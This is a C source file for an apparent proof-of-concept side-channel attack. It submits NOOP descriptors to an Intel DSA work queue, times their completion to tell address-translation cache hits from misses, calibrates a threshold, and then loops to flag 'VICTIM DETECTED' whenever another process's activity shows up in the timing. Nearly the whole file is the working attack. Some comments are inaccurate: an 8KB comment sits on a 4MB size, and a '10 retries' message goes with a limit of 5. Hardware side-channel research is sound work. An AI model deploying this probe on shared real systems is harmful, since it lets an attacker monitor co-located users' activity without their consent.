#include "dsa.h"

#define BLEN (4096 << 0)  // 4KB
#define COMP_ARRAY_SIZE (4096 << 10)  // 8KB
#define CALIBRATION_RUNS 10000
#define ATTACK_INTERVAL_MS 100
#define DIFF_THRESHOLD 300
#define CALIBRATION_RETRIES 5

#define UPDATE_THRESHOLD(hit, miss) ((hit + miss * 4) / 5)

struct wq_info wq_info;
struct dsa_hw_desc desc = {};


int main(int argc, char *argv[]) {
    printf("[attack] Starting vanilla attack...\n");
    
    // Allocate and align completion records for testing
    struct dsa_completion_record* comp_array = 
        (struct dsa_completion_record*)aligned_alloc(32, COMP_ARRAY_SIZE);
    if (!comp_array) {
        fprintf(stderr, "Failed to allocate memory\n");
        return EXIT_FAILURE;
    }
    memset(comp_array, 0, COMP_ARRAY_SIZE);
    
    // Initialize work queue
    int rc = map_wq(&wq_info);
    if (rc) {
        fprintf(stderr, "Failed to map work queue: %d\n", rc);
        free(comp_array);
        return EXIT_FAILURE;
    }

    // Prepare NOOP descriptor
    desc.opcode = DSA_OPCODE_NOOP;
    desc.flags = IDXD_OP_FLAG_CRAV | IDXD_OP_FLAG_RCR;
    
    int calib_retry = 0;
calib:
    // Calibrate TLB hit and miss latencies
    printf("[attack] Calibrating TLB hit and miss latencies...\n");
    if (calib_retry++ > CALIBRATION_RETRIES) {
        printf("[attack] Calibration failed after 10 retries\n");
        free(comp_array);
        return EXIT_FAILURE;
    }
    
    uint64_t miss_total = 0, hit_total = 0;
    
    // Initial probe to warm up (discard result)
    probe(&comp_array[0]);
    
    // Measure miss latency
    for (int i = 0; i < CALIBRATION_RUNS; i++) {
        probe(&comp_array[4096 << 1]);
        probe(&comp_array[4096 << 2]);
        probe(&comp_array[(4096 << 2) + 4096]);
        miss_total += probe(&comp_array[0]);
        hit_total += probe(&comp_array[0]);
    }
    uint64_t avg_miss = miss_total / CALIBRATION_RUNS;
    uint64_t avg_hit = hit_total / CALIBRATION_RUNS;

    if (avg_miss < avg_hit || avg_miss - avg_hit < DIFF_THRESHOLD) {
        printf("[attack] Calibration failed: miss latency is less than hit latency\n");
        goto calib;
    }
    uint64_t detection_threshold = UPDATE_THRESHOLD(avg_hit, avg_miss);
    
    printf("[attack] Calibration results:\n");
    printf("  ATC miss latency: %lu cycles\n", avg_miss);
    printf("  ATC hit latency:  %lu cycles\n", avg_hit);
    printf("  Detection threshold: %lu cycles\n", detection_threshold);
    
    // Main attack loop - detect victim activity
    printf("[attack] Starting detection (press Ctrl+C to stop)...\n");
    
    uint64_t iteration = 1;
    while (iteration++) {
        uint64_t latency = probe(comp_array);
        probe(comp_array);

        usleep(ATTACK_INTERVAL_MS * 1000);
        latency = probe(&comp_array[0]);
        bool victim_active = (latency > detection_threshold);
        
        if (victim_active) {
            printf("[attack] VICTIM DETECTED (latency = %lu)\n", 
                    latency);
            avg_miss = (avg_miss * (iteration - 1) + latency) / iteration;
            detection_threshold = UPDATE_THRESHOLD(avg_hit, avg_miss);
        } else if (iteration % (1000 / ATTACK_INTERVAL_MS) == 0) { // report every 1 sec
            printf("[attack] No victim activity (latency = %lu)\n", 
                    latency);
        }
    }
    
    return EXIT_SUCCESS;
} 

// Probe function to measure completion time
uint64_t probe(void* addr) {
    uint64_t start, end;
    int retry = 0;
    struct dsa_completion_record* comp_record = (struct dsa_completion_record*)addr;
    memset(comp_record, 0, sizeof(struct dsa_completion_record));
    
    desc.completion_addr = (uintptr_t)comp_record;
    
    // Submit the descriptor
    if (wq_info.wq_mapped) {
        // Measure time to completion
        start = rdtsc();
        submit_desc(wq_info.wq_portal, &desc);
    } else {
        int rc = write(wq_info.wq_fd, &desc, sizeof(desc));
        if (rc != sizeof(desc)) {
            fprintf(stderr, "Failed to submit descriptor\n");
            return 0;
        }
        start = rdtsc();
    }
    
    // Wait for completion
    while (comp_record->status == 0 && retry++ < MAX_COMP_RETRY) {
        umonitor(comp_record);
        if (comp_record->status == 0) {
            uint64_t delay = rdtsc() + UMWAIT_DELAY;
            umwait(UMWAIT_STATE_C0_1, delay);
        }
    }
    end = rdtsc();
    
    return end - start;
}